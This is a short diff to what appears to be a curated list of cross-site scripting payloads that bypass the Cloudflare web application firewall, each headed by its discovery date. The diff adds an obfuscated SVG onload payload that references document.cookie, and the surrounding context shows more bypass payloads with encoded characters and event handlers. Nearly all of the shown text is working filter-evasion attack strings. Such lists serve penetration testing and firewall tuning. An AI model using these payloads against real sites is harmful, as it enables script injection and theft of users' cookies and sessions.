@@ -5,6 +5,9 @@ The payloads are headed by the date of discovery of the bypass.
 ### Cloudflare
 
 ```csharp
+//24-10-2021:
+<svg onload=alert&#0000000040document.cookie)>
+
 //06-10-2021:
 ";(a=alert,b=1,a(b))
 
@@ -59,4 +62,3 @@ The payloads are headed by the date of discovery of the bypass.
 //09-07-2019:
 \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
 ```
-
